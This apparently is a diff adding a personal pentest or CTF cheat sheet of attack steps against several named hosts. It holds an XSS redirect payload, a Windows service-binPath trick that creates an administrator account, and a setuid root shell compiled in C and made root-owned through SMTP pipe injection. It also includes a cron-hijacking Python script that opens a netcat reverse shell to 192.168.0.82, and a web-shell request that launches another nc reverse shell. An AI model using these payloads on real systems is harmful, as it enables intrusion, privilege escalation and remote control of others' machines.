@@ -1,0 +1,78 @@
+'">><script type="text/javascript"> window.location.replace("http://192.168.0.82:8080/test");</script>
+
+#######
+sc stop WebDriveService
+sc config WebDriveService binPath= "cmd /c net user southriver kills /add && net localgroup Administrators southriver /add"
+sc start WebDriveService
+runas /noprofile /user:%COMPUTERNAME%\southriver cmd
+
+#######
+
+Bill:
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+Bypassing limited shell
+echo os.system('/bin/bash')
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+pico /var/tmp/shell.c
+
+---shell.c----
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+---------
+
+gcc /var/tmp/shell.c -o /var/tmp/sushell
+chmod 755 /var/tmp/sushell
+
+nc localhost 25
+mail from:me@me.com
+rcpt to: root+:"|chown root:root /var/tmp/sushell"
+rcpt to: root+:"|chmod u+s /var/tmp/sushell"
+
+./var/tmp/sushell
+
+###########
+
+jack:
+
+#!/usr/bin/python -w
+
+import os, sys
+import pwd
+
+#file = "/var/log/cron"
+
+files = sys.argv
+new = open('/var/www/syslog.html','w')
+new.write('Start')
+new.close()
+for x in range(1,3):
+     f = open(files[x],'r')
+     lines = f.read()
+     f.close()
+     html = open('/var/www/syslog.html','a')
+     html.write(lines)
+     html.close()
+os.system('/tmp/nc -e /bin/bash 192.168.0.82 443')
+-----
+chmod 777 /var/www/.getSyslog.py
+cat /tmp/test.py > /var/www/.getSyslog.py
+wait 5 minutes for the cron to run python /var/www/.getSyslog.py arg1 arg2 arg3 to get the shell
+
+#############
+
+Jim:
+
+wget http://10.4.4.99/cmd.php --post-data 'data=nc 10.4.4.44 6666 -e /bin/bash'
+python -c 'import pty; pty.spawn("/bin/sh")'
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+#########
+
